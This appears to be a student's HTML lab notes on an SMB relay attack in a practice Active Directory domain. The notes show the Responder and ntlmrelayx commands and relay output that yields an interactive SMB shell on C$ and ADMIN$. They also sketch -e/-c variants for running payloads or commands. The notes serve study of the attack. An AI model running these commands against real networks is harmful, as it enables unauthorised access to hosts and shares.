@@ -1,0 +1,231 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>SMB Relay Attack Demonstration Part 2</title>
+</head><body>- Let's boot up the responder with HTTP and SMB off <br/>
+So our responder is listening now <br/>
+<br/>
+<img height="434" src="screenshot 2023-03-06 133514.png" width="350"/><br/>
+<br/>
+- Now boot up the NTLM relay but we will put the -i in the end for interactive (i.e. to get interactive shell)<br/>
+<br/>
+<img height="231" src="screenshot 2023-03-06 134342.png" width="650"/><br/>
+<br/>
+──(root㉿kali)-[/home/kali]<br/>
+└─# ntlmrelayx.py -tf targets.txt -smb2support -i<br/>
+Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation<br/>
+<br/>
+[*] Protocol Client SMTP loaded..<br/>
+[*] Protocol Client LDAP loaded..<br/>
+[*] Protocol Client LDAPS loaded..<br/>
+/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.<br/>
+[*] Protocol Client MSSQL loaded..<br/>
+[*] Protocol Client SMB loaded..<br/>
+[*] Protocol Client IMAPS loaded..<br/>
+[*] Protocol Client IMAP loaded..<br/>
+[*] Protocol Client HTTPS loaded..<br/>
+[*] Protocol Client HTTP loaded..<br/>
+[*] Running in relay mode to hosts in targetfile<br/>
+[*] Setting up SMB Server<br/>
+[*] Setting up HTTP Server<br/>
+<br/>
+[*] Servers started, waiting for connections<br/>
+[*] SMBD-Thread-3: Received connection from 192.168.205.138, attacking target smb://192.168.205.141<br/>
+[*] Authenticating against smb://192.168.205.141 as MARVEL\fcastle SUCCEED<br/>
+[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000<br/>
+[*] SMBD-Thread-5: Received connection from 192.168.205.138, attacking target smb://192.168.205.141<br/>
+[*] Authenticating against smb://192.168.205.141 as MARVEL\fcastle SUCCEED<br/>
+[*] Started interactive SMB client shell via TCP on 127.0.0.1:11001<br/>
+[*] SMBD-Thread-7: Received connection from 192.168.205.138, attacking target smb://192.168.205.141<br/>
+[*] Authenticating against smb://192.168.205.141 as MARVEL\fcastle SUCCEED<br/>
+[*] Started interactive SMB client shell via TCP on 127.0.0.1:11002<br/>
+<br/>
+<br/>
+<br/>
+Will open a new tab and type the following command<br/>
+<br/>
+<img height="260" src="screenshot 2023-03-06 134601.png" width="600"/><br/>
+<br/>
+<img height="464" src="screenshot 2023-03-06 135607.png" width="600"/><br/>
+<br/>
+┌──(root㉿kali)-[/home/kali]<br/>
+└─# nc 127.0.0.1 11000             <br/>
+Type help for list of commands<br/>
+# help<br/>
+<br/>
+open {host,port=445} - opens a SMB connection against the target host/port<br/>
+login {domain/username,passwd} - logs into the current SMB connection, no parameters for NULL connection. If no password specified, it'll be prompted<br/>
+kerberos_login {domain/username,passwd} - logs into the current SMB connection using Kerberos. If no password specified, it'll be prompted. Use the DNS resolvable domain name<br/>
+login_hash {domain/username,lmhash:nthash} - logs into the current SMB connection using the password hashes<br/>
+logoff - logs off<br/>
+shares - list available shares<br/>
+use {sharename} - connect to an specific share<br/>
+cd {path} - changes the current directory to {path}<br/>
+lcd {path} - changes the current local directory to {path}<br/>
+pwd - shows current remote directory<br/>
+password - changes the user password, the new password will be prompted for input<br/>
+ls {wildcard} - lists all the files in the current directory<br/>
+rm {file} - removes the selected file<br/>
+mkdir {dirname} - creates the directory under the current path<br/>
+rmdir {dirname} - removes the directory under the current path<br/>
+put {filename} - uploads the filename into the current path<br/>
+get {filename} - downloads the filename from the current path<br/>
+mount {target,path} - creates a mount point from {path} to {target} (admin required)<br/>
+umount {path} - removes the mount point at {path} without deleting the directory (admin required)<br/>
+info - returns NetrServerInfo main results<br/>
+who - returns the sessions currently connected at the target host (admin required)<br/>
+close - closes the current SMB Session<br/>
+exit - terminates the server process (and this session)<br/>
+<br/>
+<br/>
+# shares<br/>
+ADMIN$<br/>
+C$<br/>
+IPC$<br/>
+Share<br/>
+# use C$<br/>
+# ls<br/>
+drw-rw-rw-     0 Mon Mar 6 11:38:53 2023 $Recycle.Bin<br/>
+drw-rw-rw-     0 Sun Mar 5 14:28:54 2023 $WinREAgent<br/>
+-rw-rw-rw-     0 Sun Mar 5 08:33:54 2023 34eeae46-7449-4cf9-99af-39ee7e4a5933<br/>
+-rw-rw-rw-     0 Sun Mar 5 08:33:54 2023 647846ef-82c4-4282-88b9-663a089356cc<br/>
+drw-rw-rw-     0 Sun Mar 5 11:50:46 2023 Config.Msi<br/>
+drw-rw-rw-     0 Sun Mar 5 11:27:16 2023 Documents and Settings<br/>
+-rw-rw-rw-    8192 Sun Mar 5 13:16:55 2023 DumpStack.log<br/>
+-rw-rw-rw-    8192 Mon Mar 6 12:37:09 2023 DumpStack.log.tmp<br/>
+-rw-rw-rw- 1409286144 Mon Mar 6 12:37:09 2023 pagefile.sys<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:20 2023 PerfLogs<br/>
+drw-rw-rw-     0 Sun Mar 5 14:16:30 2023 Program Files<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:22 2023 Program Files (x86)<br/>
+drw-rw-rw-     0 Sun Mar 5 13:00:35 2023 ProgramData<br/>
+drw-rw-rw-     0 Sun Mar 5 11:24:51 2023 Recovery<br/>
+drw-rw-rw-     0 Sun Mar 5 12:54:17 2023 Share<br/>
+-rw-rw-rw-  16777216 Mon Mar 6 12:37:09 2023 swapfile.sys<br/>
+drw-rw-rw-     0 Sun Mar 5 11:27:25 2023 System Volume Information<br/>
+drw-rw-rw-     0 Sun Mar 5 13:04:22 2023 Users<br/>
+drw-rw-rw-     0 Sun Mar 5 15:59:50 2023 Windows<br/>
+drw-rw-rw-     0 Sun Mar 5 13:14:33 2023 Windows.old<br/>
+drw-rw-rw-     0 Sun Mar 5 11:26:22 2023 Windows.old.000<br/>
+# use ADMIN$<br/>
+# ls<br/>
+drw-rw-rw-     0 Sun Mar 5 15:59:50 2023 .<br/>
+drw-rw-rw-     0 Sun Mar 5 15:59:50 2023 ..<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:35 2023 addins<br/>
+drw-rw-rw-     0 Mon Mar 6 11:26:59 2023 appcompat<br/>
+drw-rw-rw-     0 Sun Mar 5 15:59:50 2023 apppatch<br/>
+drw-rw-rw-     0 Mon Mar 6 11:19:29 2023 AppReadiness<br/>
+drw-rw-rw-     0 Sun Mar 5 12:08:51 2023 assembly<br/>
+drw-rw-rw-     0 Sun Mar 5 15:59:50 2023 bcastdvr<br/>
+-rw-rw-rw-   81408 Mon Mar 6 00:40:57 2023 bfsvc.exe<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:43 2023 BitLockerDiscoveryVolumeContents<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:43 2023 Boot<br/>
+-rw-rw-rw-   67584 Mon Mar 6 13:34:50 2023 bootstat.dat<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:43 2023 Branding<br/>
+drw-rw-rw-     0 Mon Mar 6 11:22:17 2023 CbsTemp<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:43 2023 Containers<br/>
+drw-rw-rw-     0 Sun Mar 5 11:29:16 2023 CSC<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:43 2023 Cursors<br/>
+drw-rw-rw-     0 Sun Mar 5 12:59:14 2023 debug<br/>
+drw-rw-rw-     0 Sun Mar 5 15:59:50 2023 diagnostics<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:43 2023 DiagTrack<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:43 2023 DigitalLocker<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:43 2023 Downloaded Program Files<br/>
+-rw-rw-rw-    1947 Sun Mar 5 11:24:51 2023 DtcInstall.log<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:43 2023 ELAMBKUP<br/>
+drw-rw-rw-     0 Sun Mar 5 15:59:50 2023 en-US<br/>
+-rw-rw-rw-   30848 Mon Mar 6 00:40:57 2023 EnterpriseEval.xml<br/>
+-rw-rw-rw-  5253864 Sun Mar 5 16:01:53 2023 explorer.exe<br/>
+drw-rw-rw-     0 Sun Mar 5 15:59:50 2023 Fonts<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:43 2023 GameBarPresenceWriter<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:43 2023 Globalization<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:43 2023 Help<br/>
+-rw-rw-rw-  1075712 Sun Mar 5 16:01:58 2023 HelpPane.exe<br/>
+-rw-rw-rw-   18432 Sun Mar 5 15:37:01 2023 hh.exe<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:43 2023 IdentityCRL<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:43 2023 IME<br/>
+drw-rw-rw-     0 Sun Mar 5 15:59:50 2023 ImmersiveControlPanel<br/>
+drw-rw-rw-     0 Mon Mar 6 12:43:22 2023 INF<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:43 2023 InputMethod<br/>
+drw-rw-rw-     0 Sun Mar 5 17:43:35 2023 Installer<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:43 2023 L2Schemas<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:43 2023 LanguageOverlayCache<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:43 2023 LiveKernelReports<br/>
+drw-rw-rw-     0 Mon Mar 6 13:29:13 2023 Logs<br/>
+-rw-rw-rw-    1378 Sun Mar 5 11:20:28 2023 lsasetup.log<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:43 2023 Media<br/>
+-rw-rw-rw- 313337173 Sun Mar 5 13:16:56 2023 MEMORY.DMP<br/>
+-rw-rw-rw-   43131 Mon Mar 6 00:40:57 2023 mib.bin<br/>
+drw-rw-rw-     0 Mon Mar 6 13:21:35 2023 Microsoft.NET<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:45 2023 Migration<br/>
+drw-rw-rw-     0 Sun Mar 5 13:17:54 2023 Minidump<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:45 2023 ModemLogs<br/>
+-rw-rw-rw-   201216 Mon Mar 6 00:40:58 2023 notepad.exe<br/>
+drw-rw-rw-     0 Sun Mar 5 12:25:27 2023 OCR<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:45 2023 Offline Web Pages<br/>
+drw-rw-rw-     0 Sun Mar 5 11:26:29 2023 Panther<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:45 2023 Performance<br/>
+-rw-rw-rw-    7316 Sun Mar 5 17:44:42 2023 PFRO.log<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:45 2023 PLA<br/>
+drw-rw-rw-     0 Sun Mar 5 15:59:51 2023 PolicyDefinitions<br/>
+drw-rw-rw-     0 Mon Mar 6 13:26:44 2023 Prefetch<br/>
+drw-rw-rw-     0 Sun Mar 5 13:51:01 2023 PrintDialog<br/>
+drw-rw-rw-     0 Sun Mar 5 15:59:51 2023 Provisioning<br/>
+-rw-rw-rw-   370176 Sun Mar 5 15:37:06 2023 regedit.exe<br/>
+drw-rw-rw-     0 Mon Mar 6 12:39:46 2023 Registration<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:45 2023 RemotePackages<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:45 2023 rescache<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:45 2023 Resources<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:45 2023 SchCache<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:45 2023 schemas<br/>
+drw-rw-rw-     0 Sun Mar 5 15:59:51 2023 security<br/>
+drw-rw-rw-     0 Sun Mar 5 11:20:43 2023 ServiceProfiles<br/>
+drw-rw-rw-     0 Sun Mar 5 12:18:08 2023 ServiceState<br/>
+drw-rw-rw-     0 Sun Mar 5 15:40:03 2023 servicing<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:45 2023 Setup<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:45 2023 ShellComponents<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:45 2023 ShellExperiences<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:45 2023 SKB<br/>
+drw-rw-rw-     0 Sun Mar 5 11:28:13 2023 SoftwareDistribution<br/>
+drw-rw-rw-     0 Sun Mar 5 15:59:51 2023 Speech<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:45 2023 Speech_OneCore<br/>
+-rw-rw-rw-   163840 Sun Mar 5 16:01:57 2023 splwow64.exe<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:45 2023 System<br/>
+-rw-rw-rw-    219 Mon Mar 6 00:40:57 2023 system.ini<br/>
+drw-rw-rw-     0 Mon Mar 6 13:40:21 2023 System32<br/>
+drw-rw-rw-     0 Sun Mar 5 15:59:42 2023 SystemApps<br/>
+drw-rw-rw-     0 Sun Mar 5 16:00:20 2023 SystemResources<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:46 2023 SystemTemp<br/>
+drw-rw-rw-     0 Sun Mar 5 17:42:46 2023 SysWOW64<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:46 2023 TAPI<br/>
+drw-rw-rw-     0 Sun Mar 5 11:21:04 2023 Tasks<br/>
+drw-rw-rw-     0 Mon Mar 6 13:31:26 2023 Temp<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:46 2023 tracing<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:46 2023 twain_32<br/>
+-rw-rw-rw-   65024 Mon Mar 6 00:40:57 2023 twain_32.dll<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:46 2023 Vss<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:46 2023 WaaS<br/>
+drw-rw-rw-     0 Mon Mar 6 00:48:46 2023 Web<br/>
+-rw-rw-rw-     92 Mon Mar 6 00:40:57 2023 win.ini<br/>
+-rw-rw-rw-    670 Sun Mar 5 15:20:26 2023 WindowsShell.Manifest<br/>
+-rw-rw-rw-    276 Mon Mar 6 13:15:49 2023 WindowsUpdate.log<br/>
+-rw-rw-rw-   11776 Sun Mar 5 15:37:06 2023 winhlp32.exe<br/>
+drw-rw-rw-     0 Mon Mar 6 11:22:09 2023 WinSxS<br/>
+-rw-rw-rw-   316640 Mon Mar 6 00:40:58 2023 WMSysPr9.prx<br/>
+-rw-rw-rw-   11264 Mon Mar 6 00:40:57 2023 write.exe<br/>
+# ^C<br/>
+<br/>
+<br/>
+We could use -e for execute and try to and set up a meterpreter listerner and can use MSVENOM to make a payload and can get a shell<br/>
+in Metasploit with multi handler :<br/>
+Command :<br/>
+<b>ntlmrelayx.oy -tf targets.txt -smb2support -e test.ex</b><br/>
+<br/>
+or can try -c for command <br/>
+Command :<br/>
+<b>ntlmrelayx.oy -tf targets.txt -smb2support -c &quot;whoami&quot;</b><br/>
+<br/>
+So interactive shell is not the only way to do things but it's another way to do it.<br/>
+<br/>
+And will see what we can do with the Hashes and we have saved it and see what we can do with it in the Post Compromise Section of Active Directory Section.<br/>
+<br/>
+</body></html>
